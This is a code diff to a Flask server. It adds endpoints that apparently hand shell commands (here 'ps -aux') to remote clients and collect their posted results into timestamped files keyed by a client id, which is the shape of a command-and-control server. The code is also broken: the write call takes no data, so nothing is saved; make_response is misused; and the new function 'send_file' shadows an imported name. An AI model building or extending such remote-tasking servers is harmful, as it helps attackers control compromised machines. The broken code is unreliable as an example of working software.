@@ -2,13 +2,40 @@ from flask import Flask, make_response, send_file, request, redirect
 
 from file_manager import FileManager
 import io
+from datetime import datetime
 
 
 app = Flask(__name__)
 fm = FileManager()
 
-@app.route("/")
-def root():
+@app.route("/send_result", methods = ['POST'])
+def send_result():
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    filename = f"T{timestamp}"
+    
+    if request.content_type == 'application/octet-stream':
+        data = request.data.decode('utf-8')
+    else:
+        data = request.get_data(as_text=True)
+    
+    request_id = request.headers.get('id', None)
+    
+    if request_id:
+        filename += str(request_id)
+        
+    
+    with open(filename, "w") as file:
+        file.write()
+        
+    return make_response(200)
+
+@app.route("/get_cmd", methods = ['GET'])
+def get_cmd():
+    return make_response("ps -aux", 200)
+
+
+@app.route("/get_file", methods = ['GET'])
+def send_file():
     response = ""
 
     file_resource = fm.get()
